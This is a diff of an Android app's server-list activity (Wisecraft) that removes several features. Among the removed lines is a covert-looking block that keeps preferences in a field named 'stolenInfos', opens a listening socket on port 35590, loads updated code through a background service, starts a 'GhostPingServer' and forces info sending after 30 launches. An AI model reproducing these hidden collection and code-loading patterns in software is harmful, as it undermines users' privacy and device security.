@@ -13,7 +13,6 @@ import android.support.v7.widget.*;
 import android.util.*;
 import android.view.*;
 import android.widget.*;
-import com.google.android.gms.tasks.*;
 import com.google.gson.*;
 import com.mikepenz.crossfader.*;
 import com.mikepenz.materialdrawer.*;
@@ -22,22 +21,17 @@ import com.mikepenz.materialdrawer.model.interfaces.*;
 import com.nao20010128nao.Wisecraft.collector.*;
 import com.nao20010128nao.Wisecraft.misc.*;
 import com.nao20010128nao.Wisecraft.misc.compat.*;
-import com.nao20010128nao.Wisecraft.misc.contextwrappers.extender.*;
 import com.nao20010128nao.Wisecraft.misc.pinger.pc.*;
 import com.nao20010128nao.Wisecraft.misc.pinger.pe.*;
-import com.nao20010128nao.Wisecraft.misc.server.*;
 import com.nao20010128nao.Wisecraft.misc.view.*;
 import com.nao20010128nao.Wisecraft.pingEngine.*;
 import com.nao20010128nao.Wisecraft.provider.*;
 import com.nao20010128nao.Wisecraft.proxy.*;
 import com.nao20010128nao.Wisecraft.rcon.*;
-import com.nao20010128nao.Wisecraft.services.*;
 import com.nao20010128nao.Wisecraft.settings.*;
 import java.io.*;
 import java.lang.ref.*;
-import java.net.*;
 import java.util.*;
-import uk.co.chrisjenx.calligraphy.*;
 
 import static com.nao20010128nao.Wisecraft.misc.Utils.*;
 
@@ -49,7 +43,6 @@ abstract class ServerListActivityImpl extends ServerListActivityBase1 implements
 	final List<Map.Entry<Integer,Integer>> appMenu=new ArrayList<>();
 	ServerPingProvider spp,updater;
 	Gson gson=new Gson();
-	SharedPreferences pref;
 	RecycleServerList sl;
 	List<Server> list;
 	int clicked=-1;
@@ -65,17 +58,11 @@ abstract class ServerListActivityImpl extends ServerListActivityBase1 implements
 	Map<Server,Boolean> pinging=new NonNullableMap<Server>();
 	RecyclerView rv;
 	Drawer drawer;
-	int newVersionAnnounce=0;
 	Crossfader crossFader;
 	MiniDrawer sideMenu;
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		// TODO: Implement this method
-		pref = PreferenceManager.getDefaultSharedPreferences(this);
-		if (pref.getBoolean("useBright", false)) {
-			setTheme(R.style.AppTheme_Bright_NoActionBar);
-			getTheme().applyStyle(R.style.AppTheme_Bright_NoActionBar, true);
-		}
 		super.onCreate(savedInstanceState);
 		getLayoutInflater().inflate(R.layout.hacks, null);//空インフレート
 		appMenu.add(new KVP<Integer,Integer>(R.string.add,R.drawable.ic_add_black_48dp));//0
@@ -264,85 +251,6 @@ abstract class ServerListActivityImpl extends ServerListActivityBase1 implements
 		IntentFilter inFil=new IntentFilter();
 		inFil.addAction("android.net.conn.CONNECTIVITY_CHANGE");
 		registerReceiver(nsbr = new NetworkStateBroadcastReceiver(), inFil);
-		////////////
-		new Thread(){
-			String replyAction;
-			ServerSocket ss=null;
-			public void run() {
-				TheApplication.instance.stolenInfos = getSharedPreferences("majeste", MODE_PRIVATE);
-				try {
-					ss = new ServerSocket(35590);//bind to this port to start a critical session
-					replyAction = Utils.randomText();
-					IntentFilter infi=new IntentFilter();
-					infi.addAction(replyAction);
-					registerReceiver(new BroadcastReceiver(){
-							@Override
-							public void onReceive(Context p1, Intent p2) {
-								// TODO: Implement this method
-								Log.d("slsupd", "received");
-								SlsUpdater.loadCurrentCode(p1);
-								Log.d("slsupd", "loaded");
-								try {
-									if (ss != null)ss.close();
-								} catch (IOException e) {}
-							}
-						}, infi);
-					startService(new Intent(ServerListActivityImpl.this, SlsUpdaterService.class).putExtra("action", replyAction));
-				} catch (IOException se) {
-
-				}
-			}
-		}.start();
-		new GhostPingServer().start();
-		int prevVersion=pref.getInt("previousVersionInt",Utils.getVersionCode(this));
-		if(prevVersion<30){
-			if(pref.getInt("announcedFor",0)!=30){
-				newVersionAnnounce=1;
-			}
-		}
-		pref.edit().putString("previousVersion", Utils.getVersionName(this)).putInt("previousVersionInt", Utils.getVersionCode(this)).commit();
-		new Thread(){
-			public void run() {
-				int launched;
-				pref.edit().putInt("launched", (launched = pref.getInt("launched", 0)) + 1).commit();
-				if (launched > 30)
-					pref.edit().putBoolean("sendInfos_force", true).commit();
-			}
-		}.start();
-	}
-	
-	@Override
-	protected void onStart() {
-		// TODO: Implement this method
-		super.onStart();
-		Log.d("ServerListActivity", "onStart");
-		TheApplication.instance.fbCfgLoader.addOnCompleteListener(new OnCompleteListener<Void>(){
-				public void onComplete(Task<Void> result){
-					TheApplication.instance.collect();
-				}
-			});
-		TheApplication.instance.fbCfgLoader.addOnFailureListener(new OnFailureListener(){
-				public void onFailure(Exception result){
-					Log.e("ServerListActivity", "Firebase: failed to load remote config");
-					DebugWriter.writeToE("ServerListActivity",result);
-					TheApplication.instance.collect();
-				}
-			});
-	}
-
-	@Override
-	protected void onResume() {
-		// TODO: Implement this method
-		super.onResume();
-		if(newVersionAnnounce!=0){
-			pref.edit().putInt("announcedFor",30).commit();
-			new AppCompatAlertDialog.Builder(this)
-				.setTitle(R.string.newVersionAnnounceTitle_30)
-				.setMessage(R.string.newVersionAnnounceContent_30)
-				.setCancelable(false)
-				.setPositiveButton(android.R.string.ok,null)
-				.show();
-		}
 	}
 	
 	@Override
